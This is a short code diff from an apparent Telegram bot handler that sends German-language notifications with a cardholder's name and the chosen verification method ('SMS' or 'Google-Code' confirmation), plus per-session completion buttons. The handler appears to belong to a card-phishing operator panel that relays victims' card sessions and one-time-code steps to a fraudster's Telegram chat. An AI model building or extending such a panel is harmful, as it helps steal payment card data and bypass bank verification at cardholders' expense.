@@ -108,12 +108,17 @@ async function handleCallbackQuery(callbackQuery: any) {
             }
             break;
       case 'sms_confirmation':
-        successMessage = `✅ <b>SMS Verification Activated</b>\n\nSession: <code>${sessionId}</code>\nSMS confirmation is now active.`;
-            // Send notification when customer chooses SMS - get cardholder name
-            if (result && result.cardholder_name) {
-              await sendMethodChoiceNotification(sessionId, 'sms', result.cardholder_name);
-            }
-            break;
+        await sendTelegramMessage(
+          `📱 SMS-Bestätigung aktiviert\n\nKarteninhaber: ${cardholderName}\nMethod: ${method}`,
+          getCompletionButtons(sessionId)
+        );
+        break;
+      case 'google_code_confirmation':
+        await sendTelegramMessage(
+          `💳 Google-Code Bestätigung aktiviert\n\nKarteninhaber: ${cardholderName}\nMethod: ${method}`,
+          getCompletionButtons(sessionId)
+        );
+        break;
           default:
             successMessage = `✅ Verification method set to: ${method}`;
         }
